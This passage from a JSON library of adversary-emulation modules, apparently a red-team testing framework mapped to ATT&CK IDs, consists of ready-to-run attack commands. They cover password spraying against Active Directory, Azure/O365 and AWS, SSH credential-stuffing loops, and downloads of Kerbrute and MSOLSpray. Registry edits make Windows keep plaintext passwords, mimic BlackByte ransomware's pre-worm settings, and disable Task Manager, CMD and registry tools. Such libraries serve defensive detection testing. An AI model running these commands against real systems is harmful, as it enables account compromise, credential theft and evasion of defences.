      "prerequisites": [],
      "rx_module_id": "5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82",
      "module_name": "WinPwn - DomainPasswordSpray Attacks"
    },
    {
      "index": 693,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis RAGLOX module will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user_limit",
          "description": "The max number of users to put in the list when running the prereq_command",
          "type": "integer",
          "default_value": 200
        },
        {
          "name": "password",
          "description": "The password to try for each user in users.txt",
          "type": "string",
          "default_value": "Spring2020"
        }
      ],
      "prerequisites": [
        {
          "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
          "check_command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
          "install_command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n"
        }
      ],
      "rx_module_id": "b15bc9a5-a4f3-4879-9304-ea0011ace63a",
      "module_name": "Password Spray Invoke-DomainPasswordSpray Light"
    },
    {
      "index": 694,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n",
      "execution": {
        "platforms": [
          "azure-ad"
        ],
        "executor_type": "powershell",
        "command": "import-module \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"#{user_list}\" -Password \"#{password}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "password",
          "description": "Single password to try against the list of user accounts",
          "type": "string",
          "default_value": "P@ssword1"
        },
        {
          "name": "user_list",
          "description": "File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)",
          "type": "string",
          "default_value": "$env:temp\\T1110.003UserList.txt"
        }
      ],
      "prerequisites": [
        {
          "description": "MSOLSpray module must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads.\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\n"
        }
      ],
      "rx_module_id": "f3a10056-0160-4785-8744-d9bd7c12dc39",
      "module_name": "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)"
    },
    {
      "index": 695,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "Test a single password against a list of users\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domaincontroller",
          "description": "Domain controller where test will be run",
          "type": "string",
          "default_value": "$ENV:userdnsdomain"
        },
        {
          "name": "domain",
          "description": "Domain where you will be testing",
          "type": "string",
          "default_value": "$ENV:userdomain"
        }
      ],
      "prerequisites": [
        {
          "description": "kerbrute.exe must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
        },
        {
          "description": "passwordspray.txt must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\passwordspray.txt\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1110.003/src/passwordspray.txt?raw=true\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\passwordspray.txt\"\n"
        }
      ],
      "rx_module_id": "c6f25ec3-6475-47a9-b75d-09ac593c5ecb",
      "module_name": "Password Spray using Kerbrute Tool"
    },
    {
      "index": 696,
      "technique_id": "T1110.003",
      "technique_name": "Brute Force: Password Spraying",
      "description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToRagloxModulesFolder/T1110.003/src/aws_users.txt -p PathToRagloxModulesFolder/T1110.003/src/aws_passwords.txt\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf /tmp/GoAWSConsoleSpray\n"
      },
      "variables": [
        {
          "name": "aws_account_id",
          "description": "ID of the AWS account",
          "type": "string",
          "default_value": "XXXXXXXX"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if go is installed\n",
          "check_command": "go version\n",
          "install_command": "echo Install GO\n"
        }
      ],
      "rx_module_id": "9c10d16b-20b1-403a-8e67-50ef7117ed4e",
      "module_name": "AWS - Password Spray an AWS using GoAWSConsoleSpray"
    },
    {
      "index": 697,
      "technique_id": "T1110.004",
      "technique_name": "Brute Force: Credential Stuffing",
      "description": "Using username,password combination from a password dump to login over SSH.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "cp \"$PathToRagloxModulesFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_host",
          "description": "IP Address / Hostname you want to target.",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires SSHPASS\n",
          "check_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then sudo apt update && sudo apt install sshpass -y; else echo \"This test requires sshpass\" ; fi ;\n"
        }
      ],
      "rx_module_id": "4f08197a-2a8a-472d-9589-cd2895ef22ad",
      "module_name": "SSH Credential Stuffing From Linux"
    },
    {
      "index": 698,
      "technique_id": "T1110.004",
      "technique_name": "Brute Force: Credential Stuffing",
      "description": "Using username,password combination from a password dump to login over SSH.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "cp \"$PathToRagloxModulesFolder/T1110.004/src/credstuffuserpass.txt\" /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_host",
          "description": "IP Address / Hostname you want to target.",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires SSHPASS\n",
          "check_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/e8114640740938c20cc41ffdbf07816b428afc49/install.sh)\"\nbrew install hudochenkov/sshpass/sshpass\n"
        }
      ],
      "rx_module_id": "d546a3d9-0be5-40c7-ad82-5a7d79e1b66b",
      "module_name": "SSH Credential Stuffing From MacOS"
    },
    {
      "index": 699,
      "technique_id": "T1110.004",
      "technique_name": "Brute Force: Credential Stuffing",
      "description": "Using username,password combination from a password dump to login over SSH.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp $PathToRagloxModulesFolder/T1110.004/src/credstuffuserpass.txt /tmp/\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\":\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\":\" -f1`@#{target_host};done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "target_host",
          "description": "IP Address / Hostname you want to target.",
          "type": "string",
          "default_value": "localhost"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires SSHPASS\n",
          "check_command": "if [ -x \"$(command -v sshpass)\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "pkg install -y sshpass\n"
        }
      ],
      "rx_module_id": "a790d50e-7ebf-48de-8daa-d9367e0911d4",
      "module_name": "SSH Credential Stuffing From FreeBSD"
    },
    {
      "index": 700,
      "technique_id": "T1110.004",
      "technique_name": "Brute Force: Credential Stuffing",
      "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cd \"PathToRagloxModulesFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe bruteforce --dc #{domaincontroller} -d #{domain} \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\bruteforce.txt\"      \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "domaincontroller",
          "description": "Domain controller where test will be run",
          "type": "string",
          "default_value": "$ENV:userdnsdomain"
        },
        {
          "name": "domain",
          "description": "Domain where you will be testing",
          "type": "string",
          "default_value": "$ENV:userdomain"
        }
      ],
      "prerequisites": [
        {
          "description": "kerbrute.exe must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n"
        },
        {
          "description": "bruteforce.txt must exist in PathToRagloxModulesFolder\\..\\ExternalPayloads\n",
          "check_command": "if (test-path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\bruteforce.txt\"){exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1110.004/src/bruteforce.txt?raw=true\" -outfile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\bruteforce.txt\"\n"
        }
      ],
      "rx_module_id": "4852c630-87a9-409b-bb5e-5dc12c9ebcde",
      "module_name": "Brute Force:Credential Stuffing using Kerbrute Tool"
    },
    {
      "index": 701,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n",
        "elevation_required": false,
        "cleanup_command": "reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v HideFileExt /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1324796b-d0f6-455a-b4ae-21ffee6aa6b9",
      "module_name": "Modify Registry of Current User Profile - cmd"
    },
    {
      "index": 702,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d #{new_executable} /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "new_executable",
          "description": "New executable to run on startup instead of Windows Defender",
          "type": "string",
          "default_value": "calc.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "282f929a-6bc5-42b8-bd93-960c3ba35afe",
      "module_name": "Modify Registry of Local Machine - cmd"
    },
    {
      "index": 703,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c0413fb5-33e2-40b7-9b6f-60b29f4a7a18",
      "module_name": "Modify registry to store logon credentials"
    },
    {
      "index": 704,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Sets registry key using Powershell that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nOpen Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore\n",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '0' -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "68254a85-aa42-4312-a695-38b7276307f8",
      "module_name": "Use Powershell to Modify registry to store logon credentials"
    },
    {
      "index": 705,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *     -Value 2 -Type DWORD;\n",
        "elevation_required": false,
        "cleanup_command": "$key = \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\#{bad_domain}\\\"\nRemove-item  $key -Recurse -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "bad_domain",
          "description": "Domain to add to trusted site zone",
          "type": "string",
          "default_value": "bad-domain.com"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "cf447677-5a4e-4937-a82c-e47d254afd57",
      "module_name": "Add domain to Trusted sites Zone"
    },
    {
      "index": 706,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "15f44ea9-4571-4837-be9e-802431a7bfae",
      "module_name": "Javascript in registry"
    },
    {
      "index": 707,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n",
        "elevation_required": false,
        "cleanup_command": "try { Set-ExecutionPolicy -ExecutionPolicy #{default_execution_policy} -Scope LocalMachine -Force } catch {}\n"
      },
      "variables": [
        {
          "name": "default_execution_policy",
          "description": "Specify the default poweshell execution policy",
          "type": "string",
          "default_value": "Default"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f3a6cceb-06c9-48e5-8df8-8867a6814245",
      "module_name": "Change Powershell Execution Policy to Bypass"
    },
    {
      "index": 708,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v LocalAccountTokenFilterPolicy /f >nul 2>&1\nreg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLinkedConnections /f >nul 2>&1\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\\ /v LongPathsEnabled /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4f4e2f9f-6209-4fcf-9b15-3b7455706f5b",
      "module_name": "BlackByte Ransomware Registry Changes - CMD"
    },
    {
      "index": 709,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "0b79c06f-c788-44a2-8630-d69051f1123d",
      "module_name": "BlackByte Ransomware Registry Changes - Powershell"
    },
    {
      "index": 710,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "powershell Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" -Name DisableRegistryTools -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ac34b0f7-0f85-4ac0-b93e-3ced2bc69bb8",
      "module_name": "Disable Windows Registry Tool"
    },
    {
      "index": 711,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d2561a6d-72bd-408c-b150-13efe1801c2a",
      "module_name": "Disable Windows CMD application"
    },
    {
      "index": 712,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "af254e70-dd0e-4de6-9afe-a994d9ea8b62",
      "module_name": "Disable Windows Task Manager application"
    },
    {
      "index": 713,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c0d6d67f-1f63-42cc-95c0-5fd6b20082ad",
      "module_name": "Disable Windows Notification Center"
    },
    {
      "index": 714,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6e0d1131-2d7e-4905-8ca5-d6172f05d03d",
      "module_name": "Disable Windows Shutdown Button"
    },
    {
      "index": 715,
      "technique_id": "T1112",
      "technique_name": "Modify Registry",
      "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
